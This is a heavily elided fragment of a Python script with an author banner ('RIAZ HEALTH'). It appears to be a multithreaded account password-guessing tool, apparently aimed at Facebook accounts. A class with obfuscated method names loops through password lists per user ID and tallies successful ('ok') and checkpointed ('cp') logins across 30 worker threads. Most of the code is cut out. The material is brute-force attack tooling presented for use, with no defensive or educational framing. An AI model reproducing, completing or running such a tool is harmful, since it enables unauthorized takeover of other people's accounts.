...
from concurrent.futures import ThreadPoolExecutor as RIAZhealth
...
\033[1;36m------------------------\033[1;36m------------------------
\033[1;31m\x1b[1;96m   Author \x1b[1;96m     ➵ \x1b[1;96m    RIAZ HEALTH
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;96m[RIAZ] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with RIAZhealth(max_workers=30) as healthworld:
